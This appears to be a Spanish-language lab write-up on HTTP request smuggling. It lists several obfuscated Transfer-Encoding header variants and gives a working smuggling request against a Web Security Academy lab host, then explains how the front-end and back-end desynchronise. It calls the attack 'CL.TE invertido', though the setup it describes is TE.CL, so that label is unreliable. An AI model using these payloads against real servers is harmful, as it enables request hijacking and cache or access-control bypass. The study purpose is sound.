---
layout: default
title: 03 - HTTP request smuggling, obfuscating the TE header
---

Variaciones de un tranfer encoding ofuscado:
```
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```



```http
POST / HTTP/1.1
Host: 0a4100750381509189c3e5df0072005d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Transfer-encoding: cow
Content-Length: 4

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

x=1
0
```

---

## 🎯 ¿Qué tipo de ataque es este?

Este es un **CL.TE (Content-Length, Transfer-Encoding)**, **pero invertido**: como el back-end **no soporta chunked encoding** y se fía del `Content-Length`, se genera una **desincronización entre front-end y back-end**.

---

## 🔍 Paso a paso

### 🔹 1. Lo que ve el **front-end**:

- Ve: `Transfer-Encoding: chunked` (correcto, válido).
    
- Interpreta que el cuerpo está codificado en chunks.
    

Y empieza a leer chunks:

- Primer chunk:
    
    ```
    5c\r\n
    GPOST / HTTP/1.1\r\n
    Content-Type: application/x-www-form-urlencoded\r\n
    Content-Length: 11\r\n
    \r\n
    x=1\r\n
    ```
    
    `5c` = 92 bytes → sí, eso es un chunk válido.
    
- Luego:
    
    ```
    0\r\n\r\n
    ```
    
    ➤ Fin del cuerpo.
    

✅ Para el **front-end**: todo perfecto, reenvía esto al **back-end** como una única petición válida.

---

### 🔸 2. Lo que ve el **back-end**:

Ahora empieza el caos 😈

- El back-end **no soporta chunked**, ignora `Transfer-Encoding`, **y ve `Transfer-encoding: cow`**, que no significa nada.
    
- Entonces ignora ambos `Transfer-Encoding` y se basa en:  
    → `Content-Length: 4`
    

📌 ¿Y qué hace con eso?

- Lee **solo 4 bytes del cuerpo**:
    
    ```
    5c\r\n
    ```
    
    (Esos 4 bytes corresponden al _valor del primer chunk_, pero él no sabe que son chunks).
    
- Después de esos 4 bytes, considera que la petición **terminó**.
    

---

### 🔥 3. ¿Qué pasa con el resto?

Lo que sigue:

```http
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

x=1
0
```

Queda como "sobrante", es decir, el back-end lo ve como el inicio de una **nueva petición**, la siguiente en la misma conexión HTTP persistente.

📛 Y como la siguiente comienza con:

```http
GPOST / HTTP/1.1
```

➡️ Eso no es un método válido.

---

## 💥 Resultado final

|Momento|Qué ve el servidor|Resultado|
|---|---|---|
|Primer request|Interpreta `Content-Length: 4` → solo lee `5c\r\n`|✅ `200 OK`|
|Segundo request|Empieza con `GPOST /...` → método inválido|❌ `400 Bad Request` o `Invalid method: GPOST`|

---
